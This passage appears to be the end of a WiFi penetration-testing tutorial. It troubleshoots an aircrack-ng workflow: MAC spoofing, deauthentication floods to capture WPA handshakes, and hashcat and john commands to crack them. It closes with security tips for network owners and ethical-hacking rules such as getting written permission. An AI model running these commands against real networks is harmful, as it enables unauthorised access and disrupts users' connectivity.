ğŸ” Troubleshooting Common Issues
Monitor Mode Won't Enable:
bash
# Check for interfering processes
sudo airmon-ng check kill

# Try different drivers
sudo modprobe -r ath9k
sudo modprobe ath9k

# Use macchanger if needed
sudo macchanger -r wlan0
No Handshake Captured:
bash
# Increase deauth packets
aireplay-ng --deauth 20 -a BSSID wlan0mon

# Try different channels
airodump-ng --channel 1,6,11 wlan0mon

# Check distance to target
# Move closer to access point
Performance Optimization:
bash
# Use GPU with hashcat
hashcat -m 2500 -D 1,2 capture.hccapx wordlist.txt

# Optimize wordlist
john --wordlist=rockyou.txt --rules --stdout > optimized.txt

# Use mask attacks for patterns
hashcat -m 2500 capture.hccapx -a 3 ?l?l?l?l?l?l


ğŸ”’ Security Best Practices
For Network Owners:
Use WPA3 when available

Strong passwords (>16 characters, mixed)

Disable WPS (Wi-Fi Protected Setup)

Regular updates of router firmware

Monitor logs for suspicious activity

For Ethical Hackers:
Always get written permission

Document everything

Test in isolated environments first

Respect privacy and data protection

Follow responsible disclosure

